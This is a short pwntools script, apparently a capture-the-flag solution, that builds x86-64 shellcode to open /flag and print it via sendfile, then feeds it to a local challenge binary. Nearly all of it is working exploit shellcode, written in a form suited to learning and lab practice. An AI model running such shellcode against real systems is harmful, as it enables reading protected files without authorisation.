from pwn import *

# set some context
context.arch = "amd64"
context.encoding = "latin"
# ignore warnings
warnings.simplefilter("ignore")

# assembly goes here, most of the rest is boilerplate
assembly = f"""
// open("/flag", NULL)

// open() = 2
xor rax, rax
inc al
inc al

// push the flag string on stack
// /flag = 0x67616c662f
mov ebx, 0x67616c66
shl rbx, 8
mov bl, 0x2f

// char* rsp = "/flag"
push rbx
mov rdi, rsp
xor rsi, rsi
syscall

// sendfile(1, open(), 0, 1000)
mov rsi, rax
xor rax, rax
mov al, 0x28
xor rdi, rdi
inc rdi
xor rdx, rdx
xor r10, r10
mov r10b, 0x37
syscall

// exit(0)
xor rax, rax
mov al, 0x3c
xor rdi, rdi
syscall
"""


# the hostname will always be the same as challenge binary
with process(f"/challenge/{os.getenv('HOSTNAME')}") as target:
    info( target.readrepeat(1) )
    target.send( asm(assembly) )
    info( target.readrepeat(1) )
